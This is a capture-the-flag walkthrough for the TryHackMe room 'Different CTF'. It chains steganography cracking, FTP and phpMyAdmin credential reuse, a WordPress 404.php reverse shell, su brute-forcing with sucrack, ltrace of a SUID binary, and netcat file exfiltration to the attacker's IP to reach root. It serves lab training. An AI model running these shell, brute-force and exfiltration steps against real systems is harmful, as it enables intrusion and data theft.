# Different CTF


![Hacker image from the THM room Different CTF](https://i.imgur.com/uAE0SRq.png)

[Play](https://tryhackme.com/room/adana)

NOTE: There is an issue in the machine sometimes. On a previous run, I got:
![Home page of the website showing a database error](https://i.imgur.com/ZMCTsca.png)
`nmap` shows its a WordPress website, but ... we do not see anything here except the error. 

Redeploy the machine to fix the error. You *may* also see it later, and not immediately. Don't panic, just reset.

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello World &#8211; Just another WordPress site
Service Info: OS: Unix
```

Nothing special.

### 1.2. Web Enumeration
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u adana.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q
/wp-content           (Status: 301) [Size: 311] [--> http://adana.thm/wp-content/]
/wp-login.php         (Status: 200) [Size: 6544]                                  
/license.txt          (Status: 200) [Size: 19915]                                 
/announcements        (Status: 301) [Size: 314] [--> http://adana.thm/announcements/]
/wp-includes          (Status: 301) [Size: 312] [--> http://adana.thm/wp-includes/]  
/javascript           (Status: 301) [Size: 311] [--> http://adana.thm/javascript/]   
/readme.html          (Status: 200) [Size: 7278]                                     
/wp-admin             (Status: 301) [Size: 309] [--> http://adana.thm/wp-admin/]     
/phpmyadmin           (Status: 301) [Size: 311] [--> http://adana.thm/phpmyadmin/]   
/xmlrpc.php           (Status: 200) [Size: 0]                                        
/wp-signup.php        (Status: 500) [Size: 2609]                                     
```
Take note of:
- announcements
- phpmyadmin

Rest looks generic WordPress stuff.

### 1.3. Web Exploration
Add the line `10.10.195.53    adana.thm` in `/etc/hosts`. How do I know `adana.thm` is the domain name? Check the source code!

![WordPress website mainpage](https://i.imgur.com/wp7s0UF.png)

Info gathered:
- Standard WordPress website
- `hakanbey01` is the only user, thus the admin

We find the "hidden directory",
![hidden directory contents](https://i.imgur.com/c1twr1H.png)

### 1.4. Steganography
Interesting. Checking the `strings` and the `binwalk` commands showed nothing, however, `steghide` allows me to enter a passphrase.

```
┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile ant.jpg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

Time to use [stegseek](https://github.com/RickdeJager/stegseek)! 

Against what list? The one given to us in the same directory :)

```
┌──(kali㉿kali)-[/tmp]
└─$ stegseek -wl wordlist.txt ant.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "ant.jpg.out".


┌──(kali㉿kali)-[/tmp]
└─$ cat ant.jpg.out
RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=


┌──(kali㉿kali)-[/tmp]
└─$ echo "RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s=" | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

### 1.5 FTP
Looking around, we get an interesting file, `wp-config.php`.

```
<?php

...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

...
```
Info gathered:
- Database name
- Database username
- Database password

We have the database credentials ... how could we use them? 

### 1.6. phpMyAdmin
Recall we saw `/phpmyadmin/`. Login with the database credentials we saw in the config.

![Errors in creds in phpmyadmin](https://i.imgur.com/yvHbpz9.png)

If at this point, you see a bunch of errors, restart the machine. They should NOT happen, and the creds *are* correct.

Make sure to re-edit your `/etc/hosts` file.

![phpMyAdmin administrator page](https://i.imgur.com/F8WN2dC.png)

We are in!

Let's go to the database we saw eariler. In the `wp_users` tab, we see the username (which we saw earlier) and password hash!

### 1.7. Hash Cracking

Find the correct mode in hashcat, and we have:
```
┌──(kali㉿kali)-[/tmp]
└─$ hashcat -m {mode} hash.txt /usr/share/wordlists/rockyou.txt --quiet
{hash}:{password ;) }
```

YES!

### 1.8. WordPress Login
![WordPress login page, entering credentials we saw above](https://i.imgur.com/aqVgSnL.png)

Uh oh. Checking the `wp-config`, we see 
```
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

sneaky, don't you think? Could be `adana.thm` ... or maybe it isn't. Checking the `wp_options` tab on `/phpmyadmin/`, we get the **subdomain** :D

### 1.9. WordPress Login in Subdomain
Edit the line 
`10.10.190.211   adana.thm`
to
`10.10.190.211   adana.thm subdomain.adana.thm`

![WordPress admin page on the subdomain](https://i.imgur.com/mru5pq8.png)

We are in!

## 2. Foothold
I know of two ways we can get a shell:
1. Appearance -> Theme Editor -> edit 404.php
2. Plugins -> Add new -> Upload zip of phprevshell.


However, we see:
1. ![404.php edit page permissions error](https://i.imgur.com/rTWJrLa.png)

2. ![add new plugin page permissions error](https://i.imgur.com/r38C0xu.png)

a permission error for both. If only there was a way we could edit the file permissions ...

### 2.1. FTP (again)
```
ftp> pwd
257 "/wp-content/themes/twentynineteen" is the current directory
ftp> chmod 777 404.php
200 SITE CHMOD command ok.
```

Upload a reverse shell using the route 1 mentioned above. Shell taken from [Reverse Shell Generator](https://www.revshells.com/)

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -lnvp 443           
listening on [any] 443 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.190.211] 43448
Linux ubuntu 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 04:31:28 up 23 min,  0 users,  load average: 0.01, 0.02, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
$ 
```

We are in the system!


## 3. PrivEsc
Now, let's get **linpeas** to find priv esc vectors.
![Getting linpeas to find priv esc vectors](https://i.imgur.com/yQfXRti.png)


```
[+] Unmounted file-system?
[i] Check if you can mount umounted devices                                             
/dev/disk/by-id/dm-uuid-LVM-2vWU08UHAxgr0umysQPoxtHSdFdx70llz4fwL1Q9vtLr2IL1fPcyJc851c7izh0w    /       ext4    defaults        0 0                                             
/dev/disk/by-uuid/069d6843-2a0d-4a97-b8cd-948aa75be772  /boot   ext4    defaults       0 0
```
Nothing interesting


```
[+] Processes with credentials in memory (root req)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                                 
gdm-password Not Found                                                                  
gnome-keyring-daemon Not Found                                                          
lightdm Not Found                                                                       
vsftpd process found (dump creds from memory as root)                                   
apache2 process found (dump creds from memory as root)
sshd Not Found

```
Nothing interesting


```
[+] Checking sudo tokens
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                              
/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                                            
gdb was found in PATH
```
Interesting

```
[+] Searching ssl/ssh files
ListenAddress 127.0.0.1                                                                                                          
PermitRootLogin no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow

```
False positive

```
[+] Passwords inside pam.d
/etc/pam.d/lightdm:auth    sufficient      pam_succeed_if.so user ingroup nopasswdlogin  
```
Useless (?)

### 3.1. Sudo Token Vulnerability (Fail)
Requirements to escalate privileges:
- [x] You already have a shell as user "sampleuser"
- [ ] "sampleuser" have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password)
- [x] cat /proc/sys/kernel/yama/ptrace_scope is 0
- [x] gdb is accessible (you can be able to upload it)


> You can temporarily enable ptrace_scope with echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently modifying /etc/sysctl.d/10-ptrace.conf and setting kernel.yama.ptrace_scope = 0

[Source for the exploit](https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens)

But I can't edit `ptrace_scope` or check the point 2. Dead end.

### 3.2. Lateral Escalation: Password Cracking
Since we do not have `ssh`, we can try bruteforcing `sudo su`. We can use the wordlist we saw during steganography bruteforcing.

Download the sucrack files: [.deb from here](http://archive.ubuntu.com/ubuntu/pool/universe/s/sucrack/sucrack_1.2.3-4_amd64.deb
).

Transfer this again.

```
www-data@ubuntu:/tmp$ wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb
wget 10.17.8.184/sucrack_1.2.3-4_amd64.deb
--2021-06-03 05:01:53--  http://10.17.8.184/sucrack_1.2.3-4_amd64.deb
Connecting to 10.17.8.184:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16670 (16K) [application/vnd.debian.binary-package]
Saving to: 'sucrack_1.2.3-4_amd64.deb'

sucrack_1.2.3-4_amd 100%[===================>]  16.28K  74.2KB/s    in 0.2s    

2021-06-03 05:01:53 (74.2 KB/s) - 'sucrack_1.2.3-4_amd64.deb' saved [16670/16670]

www-data@ubuntu:/tmp$ dpkg -x sucrack_1.2.3-4_amd64.deb sucrack
dpkg -x sucrack_1.2.3-4_amd64.deb sucrack
```

I tried with the wordlist we have aleady, but it was taking too long. According to THM Discord, it should not. Maybe I'm doing something wrong?

I realised that `123adana` is a prefix we saw for both the above passowrds. Maybe the password is also starting from that? I looked it in the list and there was only one match. Did not work.

How about pre-pending `123adana` to all the words?

`sed 's/^/123adana/' /tmp/wordlist.txt > newlist.txt`

And I tried it again ...

After a long long time, I finally get

```
www-data@ubuntu:/tmp/sucrack/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
<k/usr/bin$ ./sucrack -w 128 -u hakanbey newlist.txt
password is: 123adanasubaru
www-data@ubuntu:/tmp/sucrack/usr/bin$ su hakanbey
Password: 123adana{mmm tasty}
```

### 3.3. Reverse Engineering: Binary
```
hakanbey@ubuntu:~$ find  / -type f -perm -u=s 2>/dev/null
/bin/fusermount
/bin/su
/bin/umount
/bin/mount
/bin/ping
/usr/local/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/arping
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/binary
/usr/bin/at
/usr/bin/newgrp
/usr/sbin/pppd
/usr/sbin/exim4
```

`/usr/bin/binary` looks odd.

```
hakanbey@ubuntu:~$ /usr/bin/binary
I think you should enter the correct string here ==>hi
pkill: killing pid 1545 failed: Operation not permitted
pkill: killing pid 4209 failed: Operation not permitted
pkill: killing pid 4412 failed: Operation not permitted
pkill: killing pid 4414 failed: Operation not permitted
...
```

Move binary to the place where we can get it from ftp :)
`hakanbey@ubuntu:/var/www/subdomain$ cp /usr/bin/binary .`

Give all the permissions:
`hakanbey@ubuntu:/var/www/subdomain$ chmod 777  binary `


Get the binary on your machine.
```
ftp> get binary
local: binary remote: binary
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for binary (12984 bytes).
226 Transfer complete.
12984 bytes received in 0.00 secs (93.8069 MB/s)
```

Doing `strings` on the binary, we get the following interesting information.
```
I think you should enter the correct string here ==>
/root/hint.txt
Hint! : %s
/root/root.jpg
Unable to open source!
/home/hakanbey/root.jpg
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
Unable to copy!
```

So we need something more, let's do `ltrace`.
```
┌──(kali㉿kali)-[/tmp]
└─$ ltrace ./binary
strcat("war", "zone")                                                          = "warzone"
strcat("warzone", "in")                                                        = "warzonein"
strcat("warzonein", "ada")                                                     = "warzoneinada"
strcat("warzoneinada", "na")                                                   = "warzoneinadana"
printf("I think you should enter the cor"...)                                  = 52
__isoc99_scanf(0x55e7ade00edd, 0x7fff37c28a60, 0, 0I think you should enter the correct string here ==>warzoneinada
)                           = 1
strcmp("warzoneinada", "warzoneinadana")                                       = -110
strcat("pki", "l")                                                             = "pkil"
strcat("pkil", "l")                                                            = "pkill"
strcat("pkill", " -9")                                                         = "pkill -9"
strcat("pkill -9", " -t")                                                      = "pkill -9 -t"
strcat("pkill -9 -t", " pts")                                                  = "pkill -9 -t pts"
strcat("pkill -9 -t pts", "/0")                                                = "pkill -9 -t pts/0"
system("pkill -9 -t pts/0" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                         = 256
+++ exited (status 0) +++

```

Putting in `warzoneinada` works! Let's do it on the target system.
```
hakanbey@ubuntu:~$ ./usr/bin/binary
./usr/bin/binary
bash: ./usr/bin/binary: No such file or directory
hakanbey@ubuntu:~$ /usr/bin/binary
/usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg
hakanbey@ubuntu:~$ ls
ls
binary   Documents  Music     Public    Templates  Videos
Desktop  Downloads  Pictures  root.jpg  user.txt   website
hakanbey@ubuntu:~$ 
```
Okay ... time for image handling

### 3.4. Image Handling
Copy the image using netcat, on you machine. Follow the steps:
1. Send the file to an IP with port specified.
```
hakanbey@ubuntu:~$ nc 10.17.8.184 3333 < root.jpg
nc 10.17.8.184 3333 < root.jpg
```
2. Listen and redirect.
```
┌──(kali㉿kali)-[/tmp]
└─$ nc -lnvp 3333 > img.jpg
listening on [any] 3333 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.68.111] 35942
^C
```

Looking at the mentioned offset, we get:
![hex code for the image that helps us do privesc](https://i.imgur.com/I37Gg1G.png)

Using the hint from the room: `From HEX, To Base85`, I got the password :D

```
root@ubuntu:~# cat root.txt
cat root.txt
THM{wowowowowow}
```

System compromised!
